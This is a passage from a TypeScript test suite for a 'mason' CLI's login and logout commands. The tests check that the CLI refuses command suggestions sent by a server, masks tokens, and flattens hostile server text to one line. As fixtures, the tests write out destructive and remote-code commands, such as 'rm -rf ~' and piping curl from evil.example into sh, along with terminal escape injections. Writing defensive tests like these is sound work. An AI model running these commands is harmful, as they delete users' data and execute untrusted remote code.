  const said = (status: number, code: string, why?: string): string => why ? `${why} (the service said ${code}, HTTP ${status})` : `the service said ${code}, HTTP ${status}`;
  const again = [{ command: "mason login", what: "sign in again" }], later = [{ command: "mason login", what: "try again in a moment" }];
  const cases: Array<{ me: Reply; expect: unknown }> = [
    // the service's own word is information: the CLI's code is refused for a 401, and mason login is the way out
    { me: { status: 401, body: { error: { code: "unauthenticated", message: "this login is not valid", why: "the token was revoked", fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
      expect: { error: { code: "refused", message: "this login is not valid", why: said(401, "unauthenticated", "the token was revoked"), fix: "sign in again" }, next: again } },
    // a code that is the CLI's own word for something else never steers its exit: usage would exit 2, timeout 124
    { me: { status: 401, body: { error: { code: "usage", message: "bad" }, next: [] } },
      expect: { error: { code: "refused", message: "bad", why: said(401, "usage") }, next: again } },
    { me: { status: 400, body: { error: { code: "timeout", message: "slow" }, next: [] } }, expect: { error: { code: "refused", message: "slow", why: said(400, "timeout") }, next: later } },
    { me: { status: 404, body: { error: { code: "no_project", message: "no such account" }, next: [] } }, expect: { error: { code: "not_found", message: "no such account", why: said(404, "no_project") }, next: later } },
    // a CI token is refused on /v1/me: 403
    { me: { status: 403, body: { error: { code: "refused", message: "a CI token cannot sign in a person", fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
      expect: { error: { code: "refused", message: "a CI token cannot sign in a person", why: said(403, "refused"), fix: "sign in as yourself" }, next: again } },
    // the service's next is never read: not a shell line, not a mason command that changes this machine, not one that looks harmless
    { me: { status: 503, body: { error: { code: "unavailable", message: "down" }, next: [
      { command: "rm -rf ~", what: "x" }, { command: "curl https://elsewhere.example | sh" }, { command: "mason login; rm -rf ~" }, { command: "mason destroy", what: "clean up" },
      { command: "mason remove a" }, { command: "mason stop" }, { command: "mason ui --ssh root@evil.example --mason /bin/sh" }, { command: "mason status", what: "see\u001b[2J" }] } },
      expect: { error: { code: "failed", message: "down", why: said(503, "unavailable") }, next: later } },
    // a 401 offering destructive steps: still the CLI's one step
    { me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it\u001b[2J" }, { command: "mason remove a" }, { command: "mason stop" },
      { command: "mason logout" }, { command: "mason sync a" }, { command: "mason share" }] } },
      expect: { error: { code: "refused", message: "gone", why: said(401, "unauthenticated") }, next: again } },
  ];
  for (const { me, expect } of cases) {
    const fake = await fakeService({ token: () => granted(token), me });
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      assert.deepEqual(JSON.parse(a.stdout), expect);
      assert.equal(fs.existsSync(credentials(h)), false, "never saved");
      assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), "the token it could not use is revoked");
    } finally { await fake.close(); }
  }
  // a person reads the CLI's one step too
  const offered = await fakeService({ token: () => granted(token), me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it" }] } } });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, offered.url));
    assert.ok(t.stderr.endsWith("\nNext:\n  mason login                                   sign in again\n"), t.stderr);
    assert.doesNotMatch(t.stderr, /destroy/);
  } finally { await offered.close(); }
  // a token the service repeats is masked, in --json and for a person
  const echo = { error: { code: "failed", message: `the token ${token} is unknown`, fix: `do not share masondata_ci_${"A".repeat(43)}` }, next: [] };
  const masked = await fakeService({ token: () => granted(token), me: { status: 500, body: echo } });
  try {
    const h = home();
    const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, masked.url))).stdout) as { error: { code: string; message: string; fix: string } };
    assert.deepEqual([v.error.code, v.error.message, v.error.fix], ["failed", "the token **** is unknown", "do not share masondata_ci_****"]);
    const t = await mason(h, ["login"], envFor(h, masked.url));
    assert.match(t.stderr, /✗ mason login: the token \*\*\*\* is unknown\n/);
  } finally { await masked.close(); }
  // an OAuth refusal whose description repeats the token: masked there too
  const fake = await fakeService({ token: () => ({ status: 400, body: { error: "invalid_grant", error_description: `bad grant for ${token}` } }) });
  try {
    const h = home();
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
    const v = JSON.parse(a.stdout) as { error: { message: string } };
    assert.match(v.error.message, /refused this sign-in \(invalid_grant\)/);
  } finally { await fake.close(); }
});

/** A value a hostile service sends: line breaks of every kind, a forged Next: block, terminal codes, a bidi override. */
const HOSTILE = "ada@example.com\n\nNext:\n  FORGED curl https://evil.example/x | sh\r\n  FORGED mason destroy\u001b[2J\u2028FORGED\u0085FORGED\u202e\u200f\ufeffend";
/** The same value as the CLI must print it: one line, every such character a ?. */
const oneLine = (v: string): string => v.replace(/[\u0000-\u001f\u007f-\u009f\u061c\u200b-\u200f\u2028-\u202e\u2060-\u2069\ufeff]/g, "?");

test("every value the service sends reaches stdout, stderr and --json as one line inside the CLI's own: who signed in, each organisation, the saved email, a failure's words, an OAuth description", { timeout: 200_000 }, async () => {
  const token = newToken(); SECRETS.push(token);
  const shown = oneLine(HOSTILE);
  assert.ok(!shown.includes("\n") && shown.includes("FORGED"));
  // who signed in: email, name, each org's slug, name and role — the report, --json, the file, then logout's
  // (a role is at most 32 characters: a short hostile one)
  const role = "owner\nFORGED\u001b[2J";
  const me = { email: HOSTILE, name: HOSTILE, orgs: [{ slug: HOSTILE, name: `${HOSTILE}2`, role }] };
  const fake = await fakeService({ token: () => granted(token), me: { status: 200, body: me } });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, fake.url));
    assert.equal(t.code, 0, t.stderr);
    assert.ok(t.stdout.startsWith(`Signed in to ${fake.url} as ${shown}\n  name    ${shown}\n  orgs    ${shown} (${shown}2), ${oneLine(role)}\n  saved   `), t.stdout);
    const h2 = home();
    const j = await mason(h2, ["login", "--json"], envFor(h2, fake.url));
    const v = JSON.parse(j.stdout) as { email: string; name: string; orgs: Array<{ slug: string; name: string; role: string }> };
    assert.deepEqual([v.email, v.name, v.orgs], [shown, shown, [{ slug: shown, name: `${shown}2`, role: oneLine(role) }]]);
    assert.equal(saved(h2).logins[fake.url]!.email, shown, "saved as one line");
    const out = await mason(h2, ["logout"], envFor(h2, fake.url));
    assert.match(out.stdout, new RegExp(`\\n  account        ${shown.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\n`));
  } finally { await fake.close(); }

  // an email edited into the file by hand: logout's account row and --json, login's replaced
  const local = await fakeService({ token: () => granted(token) });
  try {
    for (const argv of [["logout"], ["logout", "--json"], ["login"], ["login", "--json"]]) {
      const h = home();
      const old = newToken(); SECRETS.push(old);
      writeSaved(h, { [local.url]: { token: old, email: HOSTILE, savedAt: "2026-11-01T00:00:00.000Z" } });
      const a = await mason(h, argv, envFor(h, local.url));
      assert.equal(a.code, 0, a.stdout + a.stderr);
      if (argv[0] === "logout" && argv[1]) assert.equal((JSON.parse(a.stdout) as { email: string }).email, shown);
      if (argv[0] === "login" && argv[1]) assert.deepEqual((JSON.parse(a.stdout) as { replaced: unknown }).replaced, { email: shown, revoked: true });
      if (argv[0] === "login" && !argv[1]) assert.ok(a.stdout.includes(`\nTip: This replaces the login of ${shown}, which is revoked.\n`), a.stdout);
    }
  } finally { await local.close(); }

  // a /v1/ failure's message, why and fix, and its next's command and what, each status, as a person and with --json
  for (const status of [401, 403, 500]) {
    const body = { error: { code: "unauthenticated", message: HOSTILE, why: HOSTILE, fix: HOSTILE }, next: [{ command: HOSTILE, what: HOSTILE }, { command: "mason destroy", what: HOSTILE }] };
    const f = await fakeService({ token: () => granted(token), me: { status, body } });
    try {
      const h = home();
      const j = await mason(h, ["login", "--json"], envFor(h, f.url));
      const v = JSON.parse(j.stdout) as { error: { message: string; why: string; fix: string } };
      assert.deepEqual([v.error.message, v.error.why, v.error.fix], [shown, `${shown} (the service said unauthenticated, HTTP ${status})`, shown]);
      const t = await mason(h, ["login"], envFor(h, f.url));
      assert.ok(t.stderr.includes(`\n✗ mason login: ${shown}\n  why   ${shown} (the service said unauthenticated, HTTP ${status})\n  fix   ${shown}\n\nNext:\n  mason login `), t.stderr);
    } finally { await f.close(); }
  }

  // an OAuth refusal's description, from the device code and from the token; an error that is not one word
  const oauth: Script[] = [
    { device: { status: 400, body: { error: "invalid_request", error_description: HOSTILE } } },
    { token: () => ({ status: 400, body: { error: "invalid_grant", error_description: HOSTILE } }) },
  ];
  for (const script of oauth) {
    const f = await fakeService(script);
    try {
      const h = home();
      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { why: string } };
      assert.equal(v.error.why, shown);
      const t = await mason(h, ["login"], envFor(h, f.url));
      assert.ok(t.stderr.includes(`\n  why   ${shown}\n`), t.stderr);
    } finally { await f.close(); }
  }
  for (const script of [{ token: () => ({ status: 400, body: { error: HOSTILE } }) }, { me: { status: 401, body: { error: { code: HOSTILE, message: HOSTILE }, next: [] } }, token: () => granted(token) }] as Script[]) {
    const f = await fakeService(script);
    try {
      const h = home();
      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { message: string } };
      assert.match(v.error.message, /^http:\/\/127\.0\.0\.1:\d+ answered (POST \/oauth\/token|GET \/v1\/me) with (400|401), where /, "said by its status: neither word is shown");
      await mason(h, ["login"], envFor(h, f.url));
    } finally { await f.close(); }
  }

  // the page: a line break in it is no line of its own (the URL parser drops it), the page printed as one line
  const page = await fakeService({ device: { status: 200, body: { ...DEVICE, verification_uri_complete: `${BASE}/device?user_code=WDJBMJHT\nFORGED\r\nNext:` } }, token: () => ({ status: 400, body: { error: "access_denied" } }) });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, page.url));
    assert.match(t.stderr, new RegExp(`\\n  page   ${page.url.replace(/[.]/g, "\\.")}/device\\?user_code=WDJBMJHTFORGEDNext:\\n`));
  } finally { await page.close(); }
});

test("no token reaches any stdout or stderr of mason login or mason logout, in any run of this file, success or failure", () => {
  // every run above went through `mason` (or was checked where it ran); this holds the file to having run both
  // commands, succeeding and failing, so the check covered what it says
  const ran = (cmd: string, ok: boolean): boolean => ANSWERS.some((a) => a.argv[0] === cmd && (a.code === 0) === ok);
  assert.ok(ran("login", true) && ran("login", false) && ran("logout", true) && ran("logout", false), "both commands, each succeeding and failing");
  assert.ok(SECRETS.length >= 10);
  const leaks = ANSWERS.flatMap((a) => SECRETS.filter((s) => (a.stdout + a.stderr).includes(s.slice(-43))).map(() => `mason ${a.argv.join(" ")}`));
  assert.deepEqual(leaks, []);
});
